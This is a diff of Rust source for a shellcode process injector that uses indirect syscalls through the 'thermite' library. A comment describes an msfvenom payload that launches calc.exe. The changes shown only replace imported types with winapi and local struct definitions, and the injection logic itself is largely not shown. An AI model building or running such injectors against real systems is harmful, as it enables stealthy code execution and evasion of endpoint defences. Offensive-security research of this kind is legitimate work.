@@ -1,12 +1,21 @@
 use std::ffi::c_void;
+use std::os::windows::raw::HANDLE;
 use std::ptr::null;
+
+use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+use winapi::um::winnt::{GENERIC_EXECUTE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS};
 
 use thermite::{debug, info};
 use thermite::indirect_syscall as syscall;
-use thermite::models::windows::*;
-use thermite::models::windows::system_info::ClientId;
 
-// use thermite::models::windows::nt_status::NtStatus;
+
+#[repr(C)]
+#[derive(Debug, Clone)]
+pub struct ClientId {
+	pub unique_process: HANDLE,
+	pub unique_thread: HANDLE,
+}
+
 
 
 /// A basic msfvenom shellcode, just spawns calc.exe
@@ -63,7 +72,14 @@ fn read_pid() -> Option<u32> {
 fn injector(pid: Option<u32>) {
 	// Declaring structures we're going to need
 	let mut thread_handle: isize = 0;
-	let oa_process = ObjectAttributes::default();
+	let oa_process = OBJECT_ATTRIBUTES {
+		Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as _,
+		RootDirectory: 0u32 as _,
+		ObjectName: 0u32 as _,
+		Attributes: 0,
+		SecurityDescriptor: 0u32 as _,
+		SecurityQualityOfService: 0u32 as _,
+	};
 
 	// This is "pseudo handle", a sort of handle constant
 	// The value -1 means it's a handle to our own process
